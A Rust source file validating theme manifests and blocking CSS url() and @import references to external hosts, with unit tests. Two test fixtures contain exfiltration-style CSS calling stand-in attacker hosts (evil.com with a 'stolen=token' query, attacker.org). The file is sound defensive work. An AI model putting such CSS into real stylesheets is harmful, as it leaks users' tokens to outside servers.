//! Theme manifest validation, security sandboxing, and contract enforcement.
//!
//! Omnis themes consist of a declarative `theme.json` manifest and CSS stylesheets.
//! JavaScript execution is strictly prohibited. CSS stylesheets are verified against
//! external network URL patterns to prevent telemetry/data exfiltration leaks.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Current supported Theme API Version
pub const CURRENT_THEME_API_VERSION: u32 = 1;

/// Theme Manifest representation conforming to the Omnis Theme Contract
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ThemeManifest {
    pub id: String,
    #[serde(rename = "apiVersion")]
    pub api_version: u32,
    #[serde(default)]
    pub name: Option<String>,
    #[serde(default)]
    pub description: Option<String>,
    #[serde(default)]
    pub author: Option<String>,
    #[serde(default)]
    pub tokens: HashMap<String, String>,
    #[serde(default)]
    pub styles: Vec<String>,
    #[serde(default)]
    pub layouts: HashMap<String, String>,
}

/// Parses and validates a `theme.json` string against the contract and supported `apiVersion`
pub fn parse_and_validate_theme_manifest(json_content: &str) -> Result<ThemeManifest, String> {
    let manifest: ThemeManifest = serde_json::from_str(json_content)
        .map_err(|e| format!("Failed to parse theme.json manifest: {}", e))?;

    if manifest.id.trim().is_empty() {
        return Err("Theme manifest 'id' must not be empty".to_string());
    }

    if manifest.api_version != CURRENT_THEME_API_VERSION {
        return Err(format!(
            "Theme \"{}\" has unsupported apiVersion {}. Supported apiVersion is {}.",
            manifest.id, manifest.api_version, CURRENT_THEME_API_VERSION
        ));
    }

    Ok(manifest)
}

/// Validates theme CSS for security compliance.
///
/// Disallows external network calls via `url(...)` or `@import` pointing to `http:`, `https:`, or protocol-relative `//`
/// to prevent CSS-based data exfiltration.
pub fn validate_theme_css_security(css: &str) -> Result<(), String> {
    let lower = css.to_lowercase();

    // 1. Check for @import with external URLs
    let mut search_idx = 0;
    while let Some(import_idx) = lower[search_idx..].find("@import") {
        let abs_idx = search_idx + import_idx;
        let rest = &lower[abs_idx..];
        let end_idx = rest.find(';').unwrap_or(rest.len());
        let import_statement = &rest[..end_idx];

        if is_external_target(import_statement) {
            return Err(format!(
                "Theme CSS security violation: external URL in @import statement: '{}'",
                import_statement.trim()
            ));
        }
        search_idx = abs_idx + 7;
    }

    // 2. Check for url(...) with external URLs
    search_idx = 0;
    while let Some(url_idx) = lower[search_idx..].find("url(") {
        let abs_idx = search_idx + url_idx;
        let rest = &lower[abs_idx + 4..];
        if let Some(close_idx) = rest.find(')') {
            let url_content = rest[..close_idx].trim().trim_matches(|c| c == '\'' || c == '"').trim();
            if is_external_url(url_content) {
                return Err(format!(
                    "Theme CSS security violation: external URL reference blocked: 'url({})'",
                    url_content
                ));
            }
            search_idx = abs_idx + 4 + close_idx + 1;
        } else {
            search_idx = abs_idx + 4;
        }
    }

    Ok(())
}

fn is_external_target(statement: &str) -> bool {
    let trimmed = statement.trim();
    trimmed.contains("http://") || trimmed.contains("https://") || trimmed.contains("\"//") || trimmed.contains("'//")
}

fn is_external_url(url: &str) -> bool {
    let trimmed = url.trim();
    trimmed.starts_with("http://")
        || trimmed.starts_with("https://")
        || trimmed.starts_with("//")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_theme_manifest() {
        let json = r##"{
            "id": "cinema-lounge",
            "apiVersion": 1,
            "tokens": { "--omnis-accent": "#e5b45a", "--omnis-card-radius": "18px" },
            "styles": ["theme.css"],
            "layouts": { "library": "grid-large" }
        }"##;

        let res = parse_and_validate_theme_manifest(json);
        assert!(res.is_ok());
        let manifest = res.unwrap();
        assert_eq!(manifest.id, "cinema-lounge");
        assert_eq!(manifest.api_version, 1);
        assert_eq!(manifest.tokens.get("--omnis-accent").unwrap(), "#e5b45a");
        assert_eq!(manifest.tokens.get("--omnis-card-radius").unwrap(), "18px");
        assert_eq!(manifest.layouts.get("library").unwrap(), "grid-large");
        assert_eq!(manifest.styles, vec!["theme.css"]);
    }

    #[test]
    fn test_unsupported_api_version_rejected() {
        let json = r#"{
            "id": "future-theme",
            "apiVersion": 2,
            "tokens": {}
        }"#;

        let res = parse_and_validate_theme_manifest(json);
        assert!(res.is_err());
        let err = res.unwrap_err();
        assert!(err.contains("unsupported apiVersion 2"));
    }

    #[test]
    fn test_css_security_allows_safe_rules() {
        let css = r#"
            [data-omnis="game-card"] {
                border-radius: var(--omnis-card-radius, 14px);
                background-color: var(--omnis-bg-card);
            }
            [data-omnis="game-card.cover"] {
                border-radius: var(--omnis-card-radius);
            }
            .custom-bg {
                background-image: url("asset://themes/cinema-lounge/pattern.png");
            }
            .data-bg {
                background-image: url('data:image/svg+xml;utf8,<svg></svg>');
            }
            .relative-bg {
                background-image: url('./assets/bg.jpg');
            }
        "#;
        assert!(validate_theme_css_security(css).is_ok());
    }

    #[test]
    fn test_css_security_blocks_external_url_leak() {
        let evil_css = r#"
            [data-omnis="game-card"] {
                background-image: url("https://evil.com/leak?stolen=token");
            }
        "#;
        let res = validate_theme_css_security(evil_css);
        assert!(res.is_err());
        let err = res.unwrap_err();
        assert!(err.contains("external URL reference blocked"));
        assert!(err.contains("https://evil.com/leak?stolen=token"));
    }

    #[test]
    fn test_css_security_blocks_external_import() {
        let evil_css = r#"
            @import url("https://attacker.org/exfiltrate.css");
            body { color: red; }
        "#;
        let res = validate_theme_css_security(evil_css);
        assert!(res.is_err());
    }
}
